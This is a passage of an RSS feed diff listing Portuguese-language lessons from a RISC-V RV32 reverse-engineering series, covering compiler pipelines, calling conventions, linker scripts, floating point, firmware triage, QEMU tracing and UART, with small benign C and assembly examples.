+&lt;li>eliminação de código morto,&lt;/li>
+&lt;li>eliminação de subexpressões comuns,&lt;/li>
+&lt;li>inlining,&lt;/li>
+&lt;li>alocação de registradores,&lt;/li>
+&lt;li>e como &lt;code>volatile&lt;/code> limita essas otimizações.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Vai rodar experimentos e validar resultados com &lt;code>objdump&lt;/code> e GDB.&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="1-o-pipeline-do-compilador-por-que-existem-várias-traduções">1. O pipeline do compilador (por que existem várias “traduções”)&lt;/h2>
+&lt;pre tabindex="0">&lt;code class="language-mermaid" data-lang="mermaid">flowchart TD
+ A[&amp;#34;C source (.c)&amp;#34;] --&amp;gt; B[&amp;#34;Frontend to IR (Intermediate Representation)&amp;#34;]
+ B --&amp;gt; C[&amp;#34;Optimizer (depends on -O level)&amp;#34;]
+ C --&amp;gt; D[&amp;#34;Backend to assembly (.s)&amp;#34;]
+ D --&amp;gt; E[&amp;#34;Assembler to object (.o)&amp;#34;]
+ E --&amp;gt; F[&amp;#34;Linker to ELF (.elf)&amp;#34;]
+&lt;/code>&lt;/pre>&lt;p>.&lt;/p></description></item><item><title>Fluxo de controle e acesso a dados em assembly RV32</title><link>https://psylinux.github.io/pt/series/experimenting-with-risc-v/10-control-flow-data-access/</link><pubDate>Tue, 20 Jan 2026 06:31:23 +0000</pubDate><guid>https://psylinux.github.io/pt/series/experimenting-with-risc-v/10-control-flow-data-access/</guid><description>&lt;h2 id="tldr">TL;DR&lt;/h2>
+&lt;ul>
+&lt;li>Você vai aprender como fluxo de controle em C (if/else, loops, switch) vira padrões de branch e jump no RV32.&lt;/li>
+&lt;li>Vai entender como RV32 faz load/store na memória (base + offset) e como o compilador representa arrays, ponteiros e structs.&lt;/li>
+&lt;li>Vai praticar um método repetível para “ler” disassembly: identificar entradas, identificar referências de memória e reconstruir a estrutura de alto nível.&lt;/li>
+&lt;/ul>
+&lt;div class="alert alert-danger my-4" role="alert">&lt;div class="fw-bold mb-2">Important&lt;/div>Uma parte enorme de engenharia reversa é simplesmente reconhecer padrões: formatos de loop, checagens de limite, tabelas de salto de switch e idioms comuns de biblioteca.&lt;/div>
+
+&lt;hr>
+&lt;h2 id="1-acesso-a-dados-no-rv32-o-modo-de-endereçamento-que-você-mais-vê">1. Acesso a dados no RV32: o modo de endereçamento que você mais vê&lt;/h2>
+&lt;p>Instruções de load/store no RV32 normalmente usam:&lt;/p></description></item><item><title>Funções, convenção de chamada e stack frames</title><link>https://psylinux.github.io/pt/series/experimenting-with-risc-v/11-functions-stack-calling-convention/</link><pubDate>Tue, 20 Jan 2026 06:31:23 +0000</pubDate><guid>https://psylinux.github.io/pt/series/experimenting-with-risc-v/11-functions-stack-calling-convention/</guid><description>&lt;h2 id="tldr">TL;DR&lt;/h2>
+&lt;ul>
+&lt;li>Você vai aprender como chamadas de função são implementadas no RV32 usando o ABI (Application Binary Interface): &lt;code>jal&lt;/code>, &lt;code>jalr&lt;/code>, o registrador &lt;code>ra&lt;/code> (Return Address) e o &lt;code>sp&lt;/code> (Stack Pointer).&lt;/li>
+&lt;li>Vai aprender a reconhecer &lt;strong>prólogos/epílogos&lt;/strong> de função, entender por que registradores são salvos/restaurados, e mapear offsets de pilha para variáveis locais/argumentos em C.&lt;/li>
+&lt;li>Vai praticar depuração de pilha com GDB: inspecionar frames, backtraces e memória ao redor de &lt;code>sp&lt;/code>.&lt;/li>
+&lt;/ul>
+&lt;div class="alert alert-danger my-4" role="alert">&lt;div class="fw-bold mb-2">Important&lt;/div>A maioria dos “crashes misteriosos” no mundo real em firmware ou código de baixo nível se reduz a: &lt;em>convenção de chamada violada&lt;/em>, &lt;em>pilha corrompida&lt;/em> ou &lt;em>aritmética de ponteiro errada&lt;/em>.&lt;/div>
+
+&lt;hr>
+&lt;h2 id="1-as-duas-instruções-que-definem-chamadas">1. As duas instruções que definem chamadas&lt;/h2>
+&lt;h3 id="jal-jump-and-link">jal (Jump And Link)&lt;/h3>
+&lt;ul>
+&lt;li>Salva &lt;code>pc+4&lt;/code> em &lt;code>ra&lt;/code> (x1)&lt;/li>
+&lt;li>Salta para um alvo&lt;/li>
+&lt;/ul>
+&lt;h3 id="jalr-jump-and-link-register">jalr (Jump And Link Register)&lt;/h3>
+&lt;ul>
+&lt;li>Usada para chamadas indiretas e retornos&lt;/li>
+&lt;li>Um retorno é comumente:&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">jalr&lt;/span> &lt;span style="color:#66d9ef">x0&lt;/span>, &lt;span style="color:#66d9ef">x1&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#75715e"># salta para ra; descarta o link
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Forma pseudo-instrução:&lt;/p></description></item><item><title>Scripts de linker, seções e mapas de memória</title><link>https://psylinux.github.io/pt/series/experimenting-with-risc-v/12-linker-scripts-memory-map/</link><pubDate>Tue, 20 Jan 2026 06:31:23 +0000</pubDate><guid>https://psylinux.github.io/pt/series/experimenting-with-risc-v/12-linker-scripts-memory-map/</guid><description>&lt;h2 id="tldr">TL;DR&lt;/h2>
+&lt;ul>
+&lt;li>Você vai aprender o que o linker realmente faz: coloca código/dados em endereços seguindo regras e produz um ELF onde &lt;strong>endereços virtuais&lt;/strong> batem com o mapa de memória do alvo.&lt;/li>
+&lt;li>Vai aprender como &lt;code>.text&lt;/code>, &lt;code>.rodata&lt;/code>, &lt;code>.data&lt;/code>, &lt;code>.bss&lt;/code> e o código de startup se relacionam com &lt;strong>VMA (Virtual Memory Address)&lt;/strong> e &lt;strong>LMA (Load Memory Address)&lt;/strong>.&lt;/li>
+&lt;li>Vai escrever um script de linker para um pequeno programa RV32 bare-metal, gerar um link map (&lt;code>.map&lt;/code>) e converter o ELF em um &lt;code>.bin&lt;/code> bruto.&lt;/li>
+&lt;/ul>
+&lt;div class="alert alert-danger my-4" role="alert">&lt;div class="fw-bold mb-2">Important&lt;/div>Trabalho com firmware e trabalho com linker script andam juntos. Se você não consegue raciocinar sobre seções e posicionamento, não consegue raciocinar com confiabilidade sobre “onde na memória” algo vive.&lt;/div>
+
+&lt;hr>
+&lt;h2 id="1-o-trabalho-do-linker-definição-prática">1. O trabalho do linker (definição prática)&lt;/h2>
+&lt;p>Dado:&lt;/p></description></item><item><title>Ponto flutuante, endianness e bit-packing (verificando com Python)</title><link>https://psylinux.github.io/pt/series/experimenting-with-risc-v/13-floats-endianness-bitpacking/</link><pubDate>Tue, 20 Jan 2026 06:31:23 +0000</pubDate><guid>https://psylinux.github.io/pt/series/experimenting-with-risc-v/13-floats-endianness-bitpacking/</guid><description>&lt;h2 id="tldr">TL;DR&lt;/h2>
+&lt;ul>
+&lt;li>Você vai aprender como &lt;code>float&lt;/code> e &lt;code>double&lt;/code> são representados (IEEE-754 (Institute of Electrical and Electronics Engineers 754)) e como esses padrões de bits aparecem em assembly e em um hexdump.&lt;/li>
+&lt;li>Vai entender por que compiladores às vezes emitem uma constante &lt;code>double&lt;/code> como dois valores &lt;code>.word&lt;/code> de 32 bits no RV32.&lt;/li>
+&lt;li>Vai aprender um método confiável de verificação: usar &lt;code>struct&lt;/code> do Python para pack/unpack e comparar com o que você vê no disassembly.&lt;/li>
+&lt;/ul>
+&lt;div class="alert alert-danger my-4" role="alert">&lt;div class="fw-bold mb-2">Important&lt;/div>“Números em assembly” são apenas bytes. Se você consegue converter entre bytes ↔ bits ↔ significado numérico, você valida constantes, tabelas e protocolos com confiança.&lt;/div>
+
+&lt;hr>
+&lt;h2 id="1-o-básico-de-ieee-754-que-você-realmente-precisa">1. O básico de IEEE-754 que você realmente precisa&lt;/h2>
+&lt;h3 id="float-32-bit">float (32-bit)&lt;/h3>
+&lt;ul>
+&lt;li>1 bit de sinal&lt;/li>
+&lt;li>8 bits de expoente&lt;/li>
+&lt;li>23 bits de fração&lt;/li>
+&lt;/ul>
+&lt;h3 id="double-64-bit">double (64-bit)&lt;/h3>
+&lt;ul>
+&lt;li>1 bit de sinal&lt;/li>
+&lt;li>11 bits de expoente&lt;/li>
+&lt;li>52 bits de fração&lt;/li>
+&lt;/ul>
+&lt;p>Fatos práticos importantes:&lt;/p></description></item><item><title>Triage de firmware e fluxo de engenharia reversa</title><link>https://psylinux.github.io/pt/series/experimenting-with-risc-v/14-firmware-triage-reverse-workflow/</link><pubDate>Tue, 20 Jan 2026 06:31:23 +0000</pubDate><guid>https://psylinux.github.io/pt/series/experimenting-with-risc-v/14-firmware-triage-reverse-workflow/</guid><description>&lt;h2 id="tldr">TL;DR&lt;/h2>
+&lt;ul>
+&lt;li>Você vai aprender um fluxo prático para sair de um firmware desconhecido (&lt;code>.bin&lt;/code>, &lt;code>.img&lt;/code>, &lt;code>.fw&lt;/code>, às vezes &lt;code>.elf&lt;/code>) para um entendimento estruturado:
+&lt;ul>
+&lt;li>identificar tipo de arquivo e arquitetura,&lt;/li>
+&lt;li>localizar limites entre código/dados,&lt;/li>
+&lt;li>recuperar endereços de carga e entry points,&lt;/li>
+&lt;li>e escolher as próximas ferramentas certas (disassembly, decompilação, emulação ou tracing no QEMU).&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Vai praticar etapas de &lt;strong>triagem repetíveis&lt;/strong> que funcionam bem para alvos embarcados (incluindo RISC-V).&lt;/li>
+&lt;/ul>
+&lt;div class="alert alert-danger my-4" role="alert">&lt;div class="fw-bold mb-2">Important&lt;/div>Engenharia reversa de firmware dá mais certo quando você trata o problema como uma investigação com checkpoints, e não como “clicar aleatoriamente em um disassembler”.&lt;/div>
+
+&lt;hr>
+&lt;h2 id="1-tipos-de-arquivos-de-firmware-o-que-você-pode-receber">1. Tipos de arquivos de firmware: o que você pode receber&lt;/h2>
+&lt;h3 id="formatos-comuns">Formatos comuns&lt;/h3>
+&lt;ul>
+&lt;li>&lt;strong>ELF&lt;/strong>: melhor cenário (símbolos, seções, entry point podem existir)&lt;/li>
+&lt;li>&lt;strong>Binário bruto (&lt;code>.bin&lt;/code>)&lt;/strong>: bytes planos, sem endereços&lt;/li>
+&lt;li>&lt;strong>Imagens contêiner&lt;/strong>: podem embutir sistema de arquivos ou múltiplas partições (ex.: bundles de update)&lt;/li>
+&lt;li>&lt;strong>Blobs comprimidos&lt;/strong>: LZMA, gzip etc.&lt;/li>
+&lt;/ul>
+&lt;h3 id="uma-realidade-central">Uma realidade central&lt;/h3>
+&lt;p>Um binário bruto &lt;strong>não&lt;/strong> informa:&lt;/p></description></item><item><title>Análise dinâmica com tracing no QEMU</title><link>https://psylinux.github.io/pt/series/experimenting-with-risc-v/15-dynamic-analysis-frida/</link><pubDate>Tue, 20 Jan 2026 06:31:23 +0000</pubDate><guid>https://psylinux.github.io/pt/series/experimenting-with-risc-v/15-dynamic-analysis-frida/</guid><description>&lt;h2 id="tldr">TL;DR&lt;/h2>
+&lt;ul>
+&lt;li>Use o tracing embutido do QEMU (&lt;code>-d&lt;/code>) para registrar o fluxo de instruções.&lt;/li>
+&lt;li>Combine logs de trace com &lt;code>objdump&lt;/code> para correlação rápida.&lt;/li>
+&lt;li>Não é preciso hardware real; o QEMU dá saída determinística.&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="1-compile-um-alvo-para-trace">1. Compile um alvo para trace&lt;/h2>
+&lt;p>Crie:&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// src/trace_target.c
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;#34;types.h&amp;#34;&lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;#34;uart.h&amp;#34;&lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">volatile&lt;/span> u32 g_state &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0u&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">step&lt;/span>(u32 x) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> g_state &lt;span style="color:#f92672">^=&lt;/span> (x &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x1234u&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (u32 i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0u&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">5u&lt;/span>; i&lt;span style="color:#f92672">++&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">step&lt;/span>(i);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">uart_puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;state=&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">uart_puthex32&lt;/span>(g_state);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">uart_putc&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;\n&amp;#39;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Compile:&lt;/p></description></item><item><title>Interfaces no QEMU: UART e conceitos de MMIO</title><link>https://psylinux.github.io/pt/series/experimenting-with-risc-v/16-hardware-interfaces-uart-jtag-spi-i2c/</link><pubDate>Tue, 20 Jan 2026 06:31:23 +0000</pubDate><guid>https://psylinux.github.io/pt/series/experimenting-with-risc-v/16-hardware-interfaces-uart-jtag-spi-i2c/</guid><description>&lt;h2 id="tldr">TL;DR&lt;/h2>
+&lt;ul>
+&lt;li>Usamos a &lt;strong>UART do QEMU &lt;code>virt&lt;/code>&lt;/strong> para toda a saída.&lt;/li>
+&lt;li>UART é um dispositivo MMIO simples e ideal para aprendizado bare-metal.&lt;/li>
+&lt;li>JTAG, SPI e I2C são apresentados conceitualmente, mas não exigimos hardware real.&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="1-uart-no-qemu-virt">1. UART no QEMU virt&lt;/h2>
+&lt;p>A máquina &lt;code>virt&lt;/code> expõe uma UART em um endereço MMIO fixo:&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-text" data-lang="text">&lt;span style="display:flex;">&lt;span>UART0 base: 0x10000000
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Escrever um byte nesse endereço imprime um caractere.&lt;/p>
+&lt;h3 id="escrita-mínima-na-uart">Escrita mínima na UART&lt;/h3>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// src/uart.c (veja o arquivo completo em src/)
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75715e">#define UART0_BASE 0x10000000u
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">volatile&lt;/span> u8 &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#66d9ef">const&lt;/span> uart0 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">volatile&lt;/span> u8 &lt;span style="color:#f92672">*&lt;/span>)UART0_BASE;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">uart_putc&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> c) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>uart0 &lt;span style="color:#f92672">=&lt;/span> (u8)c;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;hr>
+&lt;h2 id="2-um-exemplo-de-uart-executável">2. Um exemplo de UART executável&lt;/h2>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// src/hello_uart.c
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;#34;types.h&amp;#34;&lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;#34;uart.h&amp;#34;&lt;/span>&lt;span style="color:#75715e">
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">uart_puts&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;UART is alive!&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Compile e rode:&lt;/p></description></item><item><title>Capstones e próximos passos</title><link>https://psylinux.github.io/pt/series/experimenting-with-risc-v/17-capstones-next-steps/</link><pubDate>Tue, 20 Jan 2026 06:31:23 +0000</pubDate><guid>https://psylinux.github.io/pt/series/experimenting-with-risc-v/17-capstones-next-steps/</guid><description>&lt;h2 id="tldr">TL;DR&lt;/h2>
+&lt;ul>
+&lt;li>Você vai ter projetos capstone práticos que combinam as habilidades da série: compilar C RV32, inspecionar internals de ELF, entender stack frames, depurar no QEMU, fazer triagem de firmware e validar com interfaces de hardware.&lt;/li>
+&lt;li>Cada capstone inclui entregáveis sugeridos, plano de teste e “stretch goals”.&lt;/li>
+&lt;li>Você também recebe um plano de estudo para ensinar este material a outras pessoas: como conduzir labs, avaliar exercícios e manter os alunos avançando.&lt;/li>
+&lt;/ul>
+&lt;div class="alert alert-danger my-4" role="alert">&lt;div class="fw-bold mb-2">Important&lt;/div>Se você estiver ensinando isso para outros, priorize &lt;strong>reprodutibilidade&lt;/strong>: um aluno deve conseguir seguir seus passos em uma máquina limpa e obter os mesmos resultados.&lt;/div>
+
+&lt;hr>
